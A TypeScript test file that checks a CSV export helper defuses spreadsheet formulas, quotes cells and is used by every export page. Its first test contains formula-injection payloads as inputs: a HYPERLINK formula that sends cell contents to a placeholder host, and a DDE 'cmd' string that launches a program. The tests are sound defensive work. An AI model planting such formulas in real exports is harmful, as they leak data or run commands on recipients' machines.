import { afterEach, describe, expect, it, vi } from "vitest";
import fs from "fs";
import path from "path";
import { csvCell, csvRow, downloadText, toCsv } from "./lib/csv";

const read = (rel: string) => fs.readFileSync(path.resolve(__dirname, rel), "utf8");

describe("a CSV cell is text, never a formula", () => {
  it("defuses anything a spreadsheet would run", () => {
    expect(csvCell('=HYPERLINK("http://x/"&A1)')).toBe(`"'=HYPERLINK(""http://x/""&A1)"`);
    expect(csvCell("@SUM(A1:A9)")).toBe(`"'@SUM(A1:A9)"`);
    expect(csvCell("-2+3+cmd|' /C calc'!A0")).toBe(`"'-2+3+cmd|' /C calc'!A0"`);
    expect(csvCell("\t=1+1")).toBe(`"'\t=1+1"`);
  });

  it("leaves a figure a figure, so the column still adds up", () => {
    for (const figure of ["-25.50", "+3", "-5%", "-$1,250.00", "0", "12.5"]) {
      expect(csvCell(figure), figure).toBe(`"${figure}"`);
    }
    expect(csvCell(-25.5)).toBe(`"-25.5"`);
  });

  it("quotes every cell, so a comma in a name never moves a column", () => {
    expect(csvRow(["Ali, Hassan", 'say "hi"', null, undefined, 7])).toBe(`"Ali, Hassan","say ""hi""","","","7"`);
    expect(toCsv([["a", "b"], ["1", "2"]])).toBe(`"a","b"\n"1","2"`);
  });
});

describe("a download lets go of its file", () => {
  afterEach(() => {
    vi.useRealTimers();
    vi.unstubAllGlobals();
  });

  it("revokes the object URL after the click", () => {
    vi.useFakeTimers();
    const revoke = vi.fn();
    vi.stubGlobal("URL", { createObjectURL: vi.fn(() => "blob:1"), revokeObjectURL: revoke });
    vi.stubGlobal("Blob", class { constructor(public parts: unknown[], public opts: unknown) {} });
    const link = { href: "", download: "", click: vi.fn() };
    vi.stubGlobal("document", {
      createElement: () => link,
      body: { appendChild: vi.fn(), removeChild: vi.fn() },
    });
    downloadText("x", "report.csv");
    expect(link.click).toHaveBeenCalled();
    expect(link.download).toBe("report.csv");
    expect(revoke).not.toHaveBeenCalled();
    vi.advanceTimersByTime(1000);
    expect(revoke).toHaveBeenCalledWith("blob:1");
  });
});

describe("every export goes through it", () => {
  const EXPORTS = [
    "components/ExportUtils.tsx",
    "pages/AuditLogs.tsx",
    "pages/Packages.tsx",
    "pages/BatchReports.tsx",
    "pages/ServicesManagement.tsx",
    "pages/ServicesReport.tsx",
    "pages/ProfitDashboardByType.tsx",
    "pages/InvoiceReports.tsx",
    "pages/BusinessAnalytics.tsx",
    "pages/BatchFinancialReport.tsx",
    "pages/portal/PortalInvoiceReports.tsx",
  ];

  for (const file of EXPORTS) {
    it(file, () => {
      const src = read(file);
      expect(src).toContain('from "@/lib/csv"');
      // The hand-rolled forms: bare commas, or quoting without the formula guard.
      expect(src).not.toMatch(/row\.join\(["'],["']\)/);
      expect(src).not.toContain("String(cell).replace(/\"/g");
    });
  }
});
